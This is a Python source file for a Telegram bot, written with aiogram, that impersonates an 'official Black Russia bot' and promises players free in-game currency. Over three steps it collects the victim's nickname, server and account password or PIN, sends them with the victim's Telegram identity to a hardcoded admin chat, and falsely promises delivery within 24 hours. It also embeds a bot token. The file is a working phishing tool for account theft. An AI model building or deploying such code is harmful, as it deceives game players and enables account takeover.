import os
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.webhook.aiohttp_server import SimpleRequestHandler
from aiohttp import web

BOT_TOKEN = "8227199147:AAGISVvUfW1jst_ut-yUW0cokTyc8Rwj-pM"
ADMIN_ID = 6005507174
OWNER_USERNAME = "@Lopppaio"

WEBHOOK_PATH = "/webhook"
WEBHOOK_SECRET = "my_secret"
BASE_WEBHOOK_URL = os.getenv("RENDER_EXTERNAL_URL")

logging.basicConfig(level=logging.INFO)
storage = MemoryStorage()
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=storage)

class GetMoneyState(StatesGroup):
    waiting_nickname = State()
    waiting_server = State()
    waiting_password = State()

def main_menu():
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Получить 25кк", callback_data="get_money")],
        [InlineKeyboardButton(text="🏠 Главное меню", callback_data="main_menu")]
    ])
    return kb

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    welcome_text = (
        "👋 *Добро пожаловать!*\n\n"
        "🤵 *Официальный бот от Black Russia*\n"
        "💰 Ты можешь получить *бесплатные 25кк* на *любом сервере*!\n\n"
        "⬇️ Используй кнопки ниже:"
    )
    await message.answer(welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@dp.callback_query(F.data == "main_menu")
async def main_menu_callback(callback: types.CallbackQuery):
    await callback.answer()
    welcome_text = "👋 *Главное меню*\n\n🤵 Официальный бот от Black Russia\n💰 Бесплатные 25кк"
    await callback.message.edit_text(welcome_text, parse_mode="Markdown", reply_markup=main_menu())

@dp.callback_query(F.data == "get_money")
async def get_money_start(callback: types.CallbackQuery, state: FSMContext):
    await callback.answer()
    await state.set_state(GetMoneyState.waiting_nickname)
    await callback.message.answer("🎮 *Шаг 1 из 3:*\nВведите ваш *НИК* в Black Russia:", parse_mode="Markdown")

@dp.message(GetMoneyState.waiting_nickname)
async def get_nickname(message: types.Message, state: FSMContext):
    await state.update_data(nickname=message.text.strip())
    await state.set_state(GetMoneyState.waiting_server)
    await message.answer("🌍 *Шаг 2 из 3:*\nУкажите название *СЕРВЕРА*:", parse_mode="Markdown")

@dp.message(GetMoneyState.waiting_server)
async def get_server(message: types.Message, state: FSMContext):
    await state.update_data(server=message.text.strip())
    await state.set_state(GetMoneyState.waiting_password)
    await message.answer("🔐 *Шаг 3 из 3:*\nВведите *ПАРОЛЬ* (или пинкод) от аккаунта:", parse_mode="Markdown")

@dp.message(GetMoneyState.waiting_password)
async def get_password(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    nickname = user_data.get("nickname")
    server = user_data.get("server")
    password = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name

    admin_msg = (
        f"🔔 *НОВАЯ ЗАЯВКА НА 25кк!*\n\n"
        f"👤 *Пользователь:* {full_name}\n"
        f"🆔 *ID:* `{user_id}`\n"
        f"📛 *Username:* @{username}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎮 *Ник:* `{nickname}`\n"
        f"🌍 *Сервер:* `{server}`\n"
        f"🔑 *Пароль:* `{password}`\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ Ожидает выдачи!"
    )

    try:
        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
        await message.answer(
            "✅ *Заявка принята!*\n\n"
            "💰 Валюта придет в течение *24 часов*.\n"
            "🙏 Спасибо!",
            parse_mode="Markdown",
            reply_markup=main_menu()
        )
    except Exception as e:
        await message.answer("⚠️ Ошибка, владелец уведомлен.")

    await state.clear()

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("⛔ Нет доступа")
        return
    await message.answer("🔧 Панель владельца. ID админа подтвержден.")

@dp.message(Command("id"))
async def get_my_id(message: types.Message):
    await message.answer(f"🆔 Ваш ID: `{message.from_user.id}`", parse_mode="Markdown")

async def on_startup() -> None:
    if BASE_WEBHOOK_URL:
        webhook_url = f"{BASE_WEBHOOK_URL}{WEBHOOK_PATH}"
        await bot.set_webhook(webhook_url, secret_token=WEBHOOK_SECRET)
        logging.info(f"Webhook set to {webhook_url}")

async def on_shutdown() -> None:
    await bot.delete_webhook()

def main():
    app = web.Application()
    webhook_requests_handler = SimpleRequestHandler(dispatcher=dp, bot=bot, secret_token=WEBHOOK_SECRET)
    webhook_requests_handler.register(app, path=WEBHOOK_PATH)
    app.on_startup.append(on_startup)
    app.on_shutdown.append(on_shutdown)
    port = int(os.getenv("PORT", "8080"))
    web.run_app(app, host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()